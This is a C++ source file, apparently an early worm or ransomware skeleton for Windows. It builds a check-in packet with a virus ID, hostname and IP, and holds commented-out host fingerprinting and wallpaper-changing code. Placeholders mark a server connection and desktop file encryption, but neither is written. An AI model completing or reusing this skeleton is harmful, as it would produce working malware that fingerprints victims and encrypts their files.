

#include <stdio.h>  
#include <iostream>
#include <tchar.h>
#include <windows.h>
#include <winsock.h>
#include "networking.h"

using namespace std;

int main()
{
    cout << "Worm initalized ... \n\n";
	char insert_key = 'A'; 
	const char* virus_id = "firstviru"; 
	const char* hostname = "dakota"; 
	const char* ip = "10.2.0.14"; 
	const char* country = "US";


	char* packet = structure_init_message(insert_key, virus_id, hostname, ip, country);
	cout << "the packet is" << packet << endl; 


	// Test the functions here



	//// Get information about the host computer
	//SYSTEM_INFO siSysInfo;

	//// Copy the hardware information to the SYSTEM_INFO structure. 

	//GetSystemInfo(&siSysInfo);

	//// Display the contents of the SYSTEM_INFO structure. 

	//printf("Hardware information: \n");
	//printf("  OEM ID: %u\n", siSysInfo.dwOemId);
	//printf("  Number of processors: %u\n",
	//	siSysInfo.dwNumberOfProcessors);
	//printf("  Page size: %u\n", siSysInfo.dwPageSize);
	//printf("  Processor type: %u\n", siSysInfo.dwProcessorType);
	//printf("  Minimum application address: %lx\n",
	//	siSysInfo.lpMinimumApplicationAddress);
	//printf("  Maximum application address: %lx\n",
	//	siSysInfo.lpMaximumApplicationAddress);
	//printf("  Active processor mask: %u\n",
	//	siSysInfo.dwActiveProcessorMask);

	//#define INFO_BUFFER_SIZE 32767
	//TCHAR  infoBuf[INFO_BUFFER_SIZE];
	//DWORD  bufCharCount = INFO_BUFFER_SIZE;

	//// Get and display the name of the computer.
	//if (!GetComputerName(infoBuf, &bufCharCount))
	//	_tprintf(TEXT("GetComputerName"));
	//_tprintf(TEXT("\nComputer name:      %s"), infoBuf);

	//// Get and display the user name.
	//if (!GetUserName(infoBuf, &bufCharCount))
	//	_tprintf(TEXT("GetUserName"));
	//_tprintf(TEXT("\nUser name:          %s"), infoBuf);

	//

	//// Connect with the server, send/recieve messages
	//

	//// Change desktop background
	//cout << "\n\nChanging desktop background \n\n";
	//int return_value = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (PVOID)L"C:/Users/Matthew/Pictures/Prom/prom.JPG", SPIF_UPDATEINIFILE);
	
	// Encrypt file on desktop

}